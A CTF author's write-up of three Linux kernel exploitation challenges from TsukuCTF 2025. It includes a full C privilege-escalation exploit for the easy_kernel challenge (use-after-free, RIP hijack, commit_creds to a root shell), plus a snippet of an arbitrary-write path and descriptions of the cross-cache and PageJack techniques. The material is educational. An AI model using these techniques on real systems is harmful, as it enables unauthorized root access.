At [TsukuCTF 2025](https://ctftime.org/event/2769), I created three kernel pwn challenges. It was my first time creating CTF challenges, but I learned a lot through the process. While creating the challenges, I focused on removing unnecessary complexity and designing challenges that would help participants learn something new. To support this, I provided the full source code (i.e., no reversing), a vmlinux with debug symbols, and an uploader for submitting exploits to the server. I hope you enjoyed them.

I will briefly go over each challenge below. The bugs and how to exploit them are explained in my blog series [*Linux Kernel Exploitation*](https://r1ru.github.io/categories/linux-kernel-exploitation/), so here I'll mainly explain the ideas behind each challenge and give some advice for beginners.

## easy_kernel (medium, 12 solves)
This challenge was originally created as an easy one, but I increased its difficulty just before the CTF. (Looking at the total number of solves, I think this was the right decision.) The bug is in `obj_free`, where the pointer `obj`, which points to a freed memory region, is not cleared:
```c
static long obj_free(void) {
    kfree(obj);
    return 0;
}
```
This results in an obvious UAF. Since we already have read and write primitives, and the victim object is allocated from kmalloc-32, we can easily control RIP by using `struct seq_operations`, which is also allocated from kmalloc-32. Since SMAP, SMEP, KASLR and KPTI are disabled,  we can achieve root privileges simply by executing `commit_creds(&init_cred)` in user space:
```c
#include <stdio.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>

#define CMD_ALLOC   0xf000
#define CMD_WRITE   0xf001
#define CMD_FREE    0xf002

typedef struct {
    size_t size;
    char *data;
} request_t;

int fd;

void obj_alloc() {
    request_t req = {};
    assert(ioctl(fd, CMD_ALLOC, &req) == 0);
}

void obj_write(char *data, size_t size) {
    request_t req = {.size = size, .data = data};
    assert(ioctl(fd, CMD_WRITE, &req) == 0);
}

void obj_free() {
    request_t req = {};
    assert(ioctl(fd, CMD_FREE, &req) == 0);
}

unsigned long user_cs, user_ss, user_rsp, user_rflags;

void save_state() {
    asm volatile (
        "movq %0, cs\n"
        "movq %1, ss\n"
        "movq %2, rsp\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        : 
        : "memory"
    );
}

void win() {
    char *argv[] = { "/bin/sh", NULL };
    execve("/bin/sh", argv, NULL);
}

void restore_state() {
    asm volatile(
        "swapgs\n"
        "movq [rsp + 0x00], %0\n"
        "movq [rsp + 0x08], %1\n"
        "movq [rsp + 0x10], %2\n"
        "movq [rsp + 0x18], %3\n"
        "movq [rsp + 0x20], %4\n"
        "iretq\n"
        :
        : "r"(win), "r"(user_cs), "r"(user_rflags), "r"(user_rsp), "r"(user_ss)
    );
}

#define addr_init_cred      0xffffffff81e3bfa0
#define addr_commit_creds   0xffffffff812a1050

void escalate_privilege() {
    void (*commit_creds) (void *) = (void *)addr_commit_creds;
    commit_creds((void *)addr_init_cred);
    restore_state();
}

int main(void) {
    save_state();
    
    fd = open("/dev/vuln", O_RDONLY);
    assert(fd != -1);

    puts("[*] Allocating the victim object");
    obj_alloc();
    obj_free();

    puts("[*] Allocating struct seq_operations to reclaim the memory");
    int seqfd = open("/proc/self/stat", O_RDONLY);
    assert(seqfd != -1);

    puts("[*] Hijacking RIP");
    char payload[0x8];
    *(unsigned long *)&payload = (unsigned long)escalate_privilege;
    obj_write(payload, sizeof(payload));

    read(seqfd, payload, 1);
}
```
Note that we have to use `commit_creds(&init_cred)` insted of `commit_creds(prepare_kernel_cred(NULL))` since, from version 6.2, we cannot pass `NULL` to `prepare_kernel_cred`:
```c
// https://elixir.bootlin.com/linux/v6.2/source/kernel/cred.c#L717-L718
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
    ...
    if (WARN_ON_ONCE(!daemon))
        return NULL;
```
To solve this challenge, you need to understand how to use UAF for privilege escalation. If you are new to kernel pwn, I recommend studying through [pawnyable](https://pawnyable.cafe/linux-kernel/).

## xcache (hard, 5 solves)
As the name suggests, the theme of this challenge is cross-cache attack. As in the easy_kernel challenge, there is an obvious UAF, but in `obj_alloc` and `obj_free`, `kmem_cache_zalloc` and `kmem_cache_free` are used respectively, meaning that a dedicated cache is being used:
```c
static long obj_alloc(int id) {
    if (objs[id] != NULL) {
        return -1;
    }
    objs[id] = kmem_cache_zalloc(obj_cachep, GFP_KERNEL);
    if (objs[id] == NULL) {
        return -1;
    }
    return 0;
}
```
```c
static long obj_free(int id) {
    kmem_cache_free(obj_cachep, objs[id]);
    return 0;
}
```
However, the other parts (i.e., the available commands and enabled mitigations) are the same. Therefore, if we can place the victim objects in kmalloc-32, the exploit above can be used as is. To achieve this, cross-cache attack is required. For a detailed explanation, please refer to [this article](https://r1ru.github.io/posts/1/).

Unfortunately, there was an unintended solution. Since I disabled slab mitigations to simplify debugging, arbitrary write can be achieved simply by:
```c
    obj_alloc(0);
    obj_free(0);

    char payload[0x200];
    *(unsigned long *)&payload[0x100] = aribitrary_addr;
    obj_write(0, payload, sizeof(payload));

    obj_alloc(1);
    obj_alloc(2);

    // TODO
    char payload[] = {};
    obj_write(2, payload, sizeof(payload));
```
By using this, we can achieve privilege escalation without cross-cache attack. This was reported by @mk3uswh0l3, who utilized it to overwrite `objs`, achieve arbitrary write, and eventually overwrite `modprobe_path` (Since `kzalloc` overwrites 0x200 bytes, writing to `modprobe_path` directly does not work). Note that since the kernel version is 6.14.2, `request_module` is not called in `search_binary_handler`(due to [this patch](https://web.git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=fa1bdca98d74472dcdb79cb948b54f63b5886c04)). So instead, we have to use AF_ALG sockets. See [this article](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch) for more details.

The reason I created this challenge is that cross-cache attack is a fundamental technique in modern kernel exploitation. If you want to learn about advanced techniques such as [Dirty PageTable](https://r1ru.github.io/posts/2/) and [DirtyCred](https://r1ru.github.io/posts/3/), understanding cross-cache attacks is a good place to start.

## new_era (very hard, 4 solves)
Unlike the other challenges, this one is extremely hardened (i.e., in addition to SMAP, SMEP, KASLR, and KPTI, additional mitigations like CONFIG_CFI_CLANG and CONFIG_STATIC_USERMODEHELPER are also enabled). To escalate privileges, we need to exploit the obvious off-by-one bug in `obj_write`:
```c
static long obj_write(char *data, size_t size) {
    if (obj == NULL || size > OBJ_SIZE) {
        return -1;
    }
    if (copy_from_user(obj->buf, data, size) != 0) {
        return -1;
    }
    obj->buf[size] = '\0';
    return 0;
}
```
The intended solution is Pagejack. By using the off-by-one bug, we can overwrite the `page` member of `struct pipe_buffer`, which leads to a page UAF. After this, there are various ways to proceed, but my approach is to overwrite the `f_mode` member of the `struct file` for /etc/passwd and overwrite it. For a detailed explanation, please refer to [this article](https://r1ru.github.io/posts/6/).

The inspiration for creating this challenge came from the [BlackHat presentation](https://youtu.be/uZW9RbZaq6A?si=LHH6rNlDy63fZVx7) about PageJack. Initially, I planned to enable CONFIG_MEMCG and use an cross-cache off-by-one bug, but I decided not to, since I though it would be too dificult.

## Conclusion
The number of solves for easy_kernel was much lower than I had expected (perhaps because TsukuCTF was announced as a CTF focusing mainly on OSINT?). As for new_era, I was bracing myself for zero solves, but to my surprise, it was solved within just two hours! I hope you enjoyed my challenges and learned something new. Feel free to ask any questions or provide feedback.
